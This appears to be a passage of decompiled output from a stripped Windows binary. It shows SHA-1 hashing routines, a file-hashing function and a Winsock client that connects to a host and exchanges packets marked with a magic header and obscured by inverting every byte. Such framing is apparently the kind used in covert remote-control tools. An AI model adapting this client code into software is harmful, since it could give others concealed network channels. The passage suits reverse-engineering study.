  uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar4 ^ uVar3) & uVar6 | uVar4 & uVar3) + uVar5 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x24) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar10 ^ uVar2) & uVar4 | uVar10 & uVar2) + uVar1 + uVar6 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar8 ^ uVar3) & uVar10 | uVar8 & uVar3) + uVar1 + uVar4 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar2 = ((uVar2 ^ uVar5) & uVar8 | uVar2 & uVar5) + uVar7 + uVar10 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x34) = uVar4;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar3) & uVar5 | uVar9 & uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar10 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar7 ^ uVar2) & uVar9 | uVar7 & uVar2) + uVar4 + uVar5 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar3 = ((uVar10 ^ uVar3) & uVar7 | uVar10 & uVar3) + uVar1 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar6 ^ uVar2) & uVar10 | uVar6 & uVar2) + uVar4 + uVar7 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar5) & uVar6 | uVar3 & uVar5) + uVar1 + uVar10 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar8 ^ uVar2) & uVar5 | uVar8 & uVar2) + uVar7 + uVar6;
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar1 = ((uVar4 ^ uVar3) & uVar8 | uVar4 & uVar3) + uVar1 + uVar5 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar6 ^ uVar2) + uVar3 + uVar8;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar6 ^ uVar5 ^ uVar1) + uVar2 + uVar4;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar1;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = (uVar3 ^ uVar5 ^ uVar4) + uVar1 + uVar6 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar2 ^ uVar4) + uVar7 + uVar5;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar9 ^ uVar3) + uVar1 + uVar4;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x24) = uVar7;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar9 ^ uVar5 ^ uVar2) + uVar3 + uVar8;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = (uVar5 ^ uVar6 ^ uVar1) + uVar7 + uVar9 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = (uVar3 ^ uVar6 ^ uVar8) + uVar1 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar2 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar5 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar9 ^ uVar2) + uVar1 + uVar4;
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar10 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar10 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar10 ^ uVar9 ^ uVar2) + uVar1 + uVar5;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar10 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x50) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x58) = uVar1;
  *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar2;
  *(int *)(in_EAX + 8) =
       *(int *)(in_EAX + 8) +
       (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar7 ^ uVar3) + uVar1 + uVar8;
  *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + (uVar3 >> 2 | uVar3 * 0x40000000);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar7;
  *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + uVar5;
  return;
}



void __cdecl FUN_00405250(undefined4 *param_1,uint param_2)

{
  uint uVar1;
  uint *puVar2;
  int iVar3;
  uint *unaff_EBX;
  uint uVar4;
  uint uVar5;
  
  uVar5 = *unaff_EBX & 0x3f;
  uVar1 = *unaff_EBX + param_2;
  uVar4 = 0x40 - uVar5;
  *unaff_EBX = uVar1;
  if (uVar1 < param_2) {
    unaff_EBX[1] = unaff_EBX[1] + 1;
  }
  if (uVar4 <= param_2) {
    do {
      FUN_00410450((undefined4 *)((int)unaff_EBX + uVar5 + 0x1c),param_1,uVar4);
      param_2 = param_2 - uVar4;
      param_1 = (undefined4 *)((int)param_1 + uVar4);
      uVar4 = 0x40;
      uVar5 = 0;
      iVar3 = 0x10;
      puVar2 = unaff_EBX + 0x17;
      do {
        uVar1 = puVar2[-1];
        puVar2 = puVar2 + -1;
        iVar3 = iVar3 + -1;
        *puVar2 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
      } while (iVar3 != 0);
      FUN_004042a0();
    } while (0x3f < param_2);
  }
  FUN_00410450((undefined4 *)(uVar5 + 0x1c + (int)unaff_EBX),param_1,param_2);
  return;
}



void __cdecl FUN_004052f0(int param_1)

{
  uint uVar1;
  sbyte sVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  uint *unaff_ESI;
  uint uVar7;
  
  uVar3 = *unaff_ESI;
  uVar7 = uVar3 & 0x3f;
  uVar4 = uVar7 + 3 >> 2;
  if (uVar4 != 0) {
    puVar6 = (uint *)((int)unaff_ESI + (uVar7 + 3 & 0xfffffffc) + 0x1c);
    do {
      uVar1 = puVar6[-1];
      puVar6 = puVar6 + -1;
      uVar4 = uVar4 - 1;
      *puVar6 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
    } while (uVar4 != 0);
  }
  sVar2 = (~(byte)uVar7 & 3) * '\b';
  *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) =
       -0x80 << sVar2 & *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) | 0x80 << sVar2;
  if (uVar7 < 0x38) {
    uVar3 = (uVar7 >> 2) + 1;
    if (0xd < uVar3) goto LAB_0040538d;
  }
  else {
    if (uVar7 < 0x3c) {
      unaff_ESI[0x16] = 0;
    }
    FUN_004042a0();
    uVar3 = 0;
  }
  puVar6 = unaff_ESI + uVar3 + 7;
  for (iVar5 = 0xe - uVar3; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
LAB_0040538d:
  unaff_ESI[0x16] = *unaff_ESI * 8;
  unaff_ESI[0x15] = unaff_ESI[1] * 8 | *unaff_ESI >> 0x1d;
  FUN_004042a0();
  uVar3 = 0;
  do {
    uVar4 = uVar3 + 1;
    *(char *)(uVar3 + param_1) =
         (char)(*(uint *)((int)unaff_ESI + (uVar3 & 0xfffffffc) + 8) >> (~(byte)uVar3 & 3) * '\b');
    uVar3 = uVar4;
  } while (uVar4 < 0x14);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_004053e0(undefined4 param_1)

{
  uint uVar1;
  undefined4 extraout_EDX;
  undefined4 uVar2;
  undefined4 extraout_EDX_00;
  uint uVar3;
  undefined4 *unaff_EDI;
  int local_1068;
  uint local_1064;
  undefined4 local_1060;
  undefined4 local_105c;
  undefined4 local_1058;
  undefined4 local_1054;
  undefined4 local_1050;
  undefined4 local_104c;
  undefined4 local_1048;
  undefined4 local_1004 [1024];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_1068;
  local_1068 = 0;
  uVar3 = 0;
  FUN_0040ac04(&local_1068);
  uVar2 = extraout_EDX;
  if (local_1068 != 0) {
    FUN_0040ace1();
    local_1064 = FUN_0040af03();
    FUN_0040ace1();
    local_105c = 0;
    local_1060 = 0;
    local_1058 = 0x67452301;
    local_1054 = 0xefcdab89;
    local_1050 = 0x98badcfe;
    local_104c = 0x10325476;
    local_1048 = 0xc3d2e1f0;
    uVar1 = FUN_0040b32a(local_1004,1,0x1000,local_1068);
    while (uVar1 != 0) {
      FUN_00405250(local_1004,uVar1);
      uVar3 = uVar3 + uVar1;
      uVar1 = FUN_0040b32a(local_1004,1,0x1000,local_1068);
    }
    FUN_004052f0((int)unaff_EDI);
    FUN_0040b3be();
    uVar2 = extraout_EDX_00;
    if (local_1064 <= uVar3) {
      FUN_0040a982(local_4 ^ (uint)&local_1068,extraout_EDX_00);
      return;
    }
  }
  *unaff_EDI = 0;
  unaff_EDI[1] = 0;
  unaff_EDI[2] = 0;
  unaff_EDI[3] = 0;
  unaff_EDI[4] = 0;
  FUN_0040a982(local_4 ^ (uint)&local_1068,uVar2);
  return;
}



void __thiscall FUN_00405540(void *this,undefined4 param_1)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar2;
  int *unaff_EBX;
  short *psVar3;
  undefined8 uVar4;
  short *psVar5;
  undefined4 local_9b0 [105];
  short local_80c;
  undefined local_80a [2038];
  uint uStack_14;
  uint uStack_10;
  uint local_8;
  undefined4 uStack_4;
  
  local_8 = DAT_00422044 ^ (uint)local_9b0;
  local_80c = 0;
  FUN_0040f8c0((undefined (*) [16])local_80a,0,0x7fe);
  psVar3 = &local_80c;
  if (this != (void *)0x0) {
    psVar3 = (short *)this;
  }
  *psVar3 = 0;
  local_9b0[0] = 0;
  iVar1 = Ordinal_115(0x101);
  if (iVar1 != 0) {
LAB_004055ac:
    FUN_0040aa6e(psVar3,0x3ff,(short *)&LAB_0041deb0);
    FUN_0040a9bd(psVar3,0x3ff,(short *)&DAT_0041ded0);
    FUN_0040a9bd(psVar3,0x3ff,(short *)&LAB_0041ded4);
    FUN_0040a982(uStack_10 ^ (uint)&stack0xfffff648,extraout_EDX);
    return;
  }
  iVar1 = Ordinal_23(2,1,6);
  *unaff_EBX = iVar1;
  if (iVar1 == -1) goto LAB_004055ac;
  iVar1 = Ordinal_52(param_1);
  if (iVar1 == 0) {
    Ordinal_11(param_1);
    iVar1 = Ordinal_51(&stack0xfffff640,4,2);
    if (iVar1 != 0) goto LAB_00405691;
    psVar5 = (short *)&LAB_0041deb0;
  }
  else {
LAB_00405691:
    Ordinal_9(uStack_4);
    uVar4 = Ordinal_4(*unaff_EBX,&stack0xfffff644,0x10);
    uVar2 = (undefined4)((ulonglong)uVar4 >> 0x20);
    if ((int)uVar4 == 0) goto LAB_00405677;
    psVar5 = (short *)&DAT_0041df14;
  }
  FUN_0040aa6e(psVar3,0x3ff,psVar5);
  FUN_0040a9bd(psVar3,0x3ff,(short *)&DAT_0041ded0);
  FUN_0040a9bd(psVar3,0x3ff,(short *)&LAB_0041ded4);
  uVar2 = extraout_EDX_00;
  if (*unaff_EBX != 0) {
    Ordinal_3(*unaff_EBX);
    *unaff_EBX = 0;
    uVar2 = extraout_EDX_01;
  }
LAB_00405677:
  FUN_0040a982(uStack_14 ^ (uint)&stack0xfffff644,uVar2);
  return;
}



undefined4 __cdecl FUN_004056e0(int *param_1,undefined4 *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  uint unaff_EDI;
  undefined4 local_4;
  
  iVar2 = 0;
  local_4 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)FUN_0040b8c1(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
    *(undefined4 *)((int)piVar3 + 2) = DAT_004230f0;
    *(undefined *)((int)piVar3 + 6) = DAT_004230f4;
    FUN_00410450((undefined4 *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_4 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    FUN_0040b6ac();
  }
  return local_4;
}



void __fastcall
FUN_00405780(undefined4 *param_1,int *param_2,undefined2 param_3,uint param_4,undefined2 *param_5)

{
  undefined4 *puVar1;
  int iVar2;
  undefined2 *puVar3;
  int *extraout_EDX;
  int *extraout_EDX_00;
  int *extraout_EDX_01;
  int *extraout_EDX_02;
  uint uVar4;
  uint uVar5;
  undefined4 local_810;
  int *local_80c;
  undefined4 *local_808;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_810;
  puVar3 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar3 = param_5;
  }
  *puVar3 = 0;
  local_810 = 0;
  local_80c = param_2;
  local_808 = param_1;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    puVar1 = (undefined4 *)FUN_0040b8c1(0x1000);
    uVar4 = param_4;
    if (0xffa < (int)param_4) {
      uVar4 = 0xffa;
    }
    *(undefined2 *)puVar1 = param_3;
    *(uint *)((int)puVar1 + 2) = param_4;
    if ((param_1 == (undefined4 *)0x0) && (param_4 == 0)) {
      iVar2 = FUN_004056e0(local_80c,puVar1);
      param_2 = extraout_EDX;
      param_1 = puVar1;
      if (iVar2 != 0) {
        local_810 = 1;
      }
    }
    else {
      FUN_00410450((undefined4 *)((int)puVar1 + 6),param_1,uVar4);
      iVar2 = FUN_004056e0(local_80c,puVar1);
      param_2 = extraout_EDX_00;
      param_1 = puVar1;
      if (iVar2 != 0) {
        for (; (int)uVar4 < (int)param_4; uVar4 = uVar4 + uVar5) {
          uVar5 = param_4 - uVar4;
          if (0x1000 < (int)uVar5) {
            uVar5 = 0x1000;
          }
          FUN_00410450(puVar1,(undefined4 *)((int)local_808 + uVar4),uVar5);
          iVar2 = FUN_004056e0(local_80c,puVar1);
          param_2 = extraout_EDX_01;
          if (iVar2 == 0) goto LAB_00405895;
        }
        local_810 = 1;
      }
    }
  }
LAB_00405895:
  if (param_1 != (undefined4 *)0x0) {
    FUN_0040b6ac();
    param_2 = extraout_EDX_02;
  }
  FUN_0040a982(local_4 ^ (uint)&local_810,param_2);
  return;
}



void __fastcall FUN_004058c0(uint *param_1,short *param_2,int *param_3,undefined4 *param_4)

{
  short *psVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  byte *pbVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar7;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  uint uVar8;
  uint uVar9;
  undefined8 uVar10;
  short *local_8dc;
  undefined4 local_8d8;
  undefined4 *local_8d4;
  uint *local_8d0;
  undefined2 local_8cc;
  short local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_8dc;
  local_8d4 = param_4;
  local_804 = 0;
  local_8d0 = param_1;
  FUN_0040f8c0((undefined (*) [16])local_802,0,0x7fe);
  local_8dc = &local_804;
  if (param_2 != (short *)0x0) {
    local_8dc = param_2;
  }
  psVar1 = local_8dc;
  *local_8dc = 0;
  iVar3 = *param_3;
  local_8d8 = 0;
  uVar7 = extraout_EDX;
  if ((iVar3 != 0) && (local_8d4 != (undefined4 *)0x0)) {
    local_8cc = local_8cc & 0xff00;
    FUN_0040f8c0((undefined (*) [16])((int)&local_8cc + 1),0,199);
    iVar3 = Ordinal_16(iVar3,&local_8cc,2,0);
    if ((iVar3 == -1) || (iVar3 == 0)) {
      FUN_0040aa6e(psVar1,0x3ff,(short *)&DAT_0041df38);
      uVar7 = extraout_EDX_05;
    }
    else {
      uVar8 = (uint)local_8cc;
      iVar3 = 0;
      uVar10 = FUN_0040b8c1(uVar8 + 2);
      uVar7 = (undefined4)((ulonglong)uVar10 >> 0x20);
      piVar4 = (int *)uVar10;
      if (uVar8 != 0) {
        do {
          uVar10 = Ordinal_16(*param_3,iVar3 + (int)piVar4,uVar8 - iVar3,0);
          puVar2 = local_8d0;
          uVar7 = (undefined4)((ulonglong)uVar10 >> 0x20);
          iVar5 = (int)uVar10;
          if ((iVar5 == -1) || (iVar5 == 0)) {
            FUN_0040aa6e(local_8dc,0x3ff,(short *)&DAT_0041df38);
            Ordinal_111();
            uVar7 = extraout_EDX_01;
            goto LAB_00405a42;
          }
          iVar3 = iVar3 + iVar5;
        } while (iVar3 < (int)uVar8);
        if (4 < iVar3) {
          uVar8 = iVar3 - 5;
          if ((DAT_004230f0 == *piVar4) && (*(char *)(piVar4 + 1) == DAT_004230f4)) {
            if (0 < (int)uVar8) {
              pbVar6 = (byte *)((int)piVar4 + 5);
              uVar9 = uVar8;
              do {
                *pbVar6 = ~*pbVar6;
                pbVar6 = pbVar6 + 1;
                uVar9 = uVar9 - 1;
              } while (uVar9 != 0);
            }
            if ((int)*local_8d0 < (int)uVar8) {
              FUN_00410450(local_8d4,(undefined4 *)((int)piVar4 + 5),*local_8d0);
              local_8d8 = 1;
              uVar7 = extraout_EDX_03;
            }
            else {
              FUN_00410450(local_8d4,(undefined4 *)((int)piVar4 + 5),uVar8);
              *puVar2 = uVar8;
              local_8d8 = 1;
